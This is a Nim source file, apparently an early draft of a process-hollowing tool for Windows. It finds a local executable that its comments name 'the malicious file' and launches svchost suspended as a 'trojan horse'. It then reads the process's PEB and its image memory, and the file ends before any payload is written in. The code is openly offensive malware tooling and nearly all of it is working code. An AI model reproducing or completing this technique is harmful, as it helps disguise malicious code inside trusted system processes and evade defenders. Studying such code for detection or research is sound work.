import winim/inc/windef
import winim/inc/winbase
import winim/lean
import os
import strutils

var
    bufsize = int32(MAX_PATH)
    sourceFileName: wstring = newWString(bufsize)
    maliciousFileName: wstring
    x: int
    pi : PROCESS_INFORMATION
    si : STARTUPINFOW
    pbi : PROCESS_BASIC_INFORMATION
    dwReturnLength: DWORD
    peb: PEB

when isMainModule:
    # Get the path of the current executable (compiled by nim)
    x = GetModuleFileNameW(0, &sourceFileName, bufsize)
    
    if x == 0:
        echo "[!] GetModuleFileNameW failed. Error: ", GetLastError()
    else:
        echo "[+] PATH of the executable:\n\t", sourceFileName

    # Get the path of the binary "helloworld.exe" stored in the same directory
    # as the current one
    var t = `-$` sourceFileName
    var y = rfind(t.string, r"\")    
    maliciousFileName = `+$` t[0..y].string & "helloworld.exe"
    
    echo "[+] PATH of the malicious file:\n\t", maliciousFileName

    # create suspended process from svchost.exe
    # basicallly the "trojan horse"
    x = CreateProcessW(NULL,`+$` "svchost", NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, &pi)
    if x == 0:
        echo "[!] CreateProcessW failed. Error: ", GetLastError()

    # get the base address of the PEB
    x = NtQueryInformationProcess(pi.hProcess, 0, &pbi, (ULONG) sizeof(pbi), &dwReturnLength)
    if x != 0:
        echo "[!] NtQueryInformationProcess failed. NTSTATUS value: ", x

    # 
    x = ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, (SIZE_T) sizeof(PEB), NULL)
    if x == 0:
        echo "[!] ReadProcessMemory failed. Error: ", GetLastError()

    var buffer : array[0x2000, byte]
    var bytes_copied : SIZE_T

    x = ReadProcessMemory(pi.hProcess, peb.Reserved3[1], &buffer, 0x2000, NULL)
    if x == 0:
        echo "[!] ReadProcessMemory failed. Error: ", GetLastError(), "\n\t", bytes_copied

    